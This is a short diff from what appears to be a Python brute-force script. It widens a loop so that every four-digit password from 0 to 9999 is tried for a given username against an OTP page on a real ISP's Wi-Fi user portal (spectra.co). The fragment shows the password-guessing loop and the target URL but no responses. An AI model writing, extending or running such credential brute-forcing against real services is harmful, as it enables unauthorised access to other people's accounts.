@@ -45,7 +45,7 @@ def main():
 
     print(f"finding password for {username}\n\n")
 
-    for password in range(1978, 10000):
+    for password in range(0, 10000):
         # First POST request
         otp_url = 'http://wifiunify38.spectra.co/userportal/pages/usermedia/spectra3/stanza-disable-random-mac/otp.jsp'
         otp_data = {
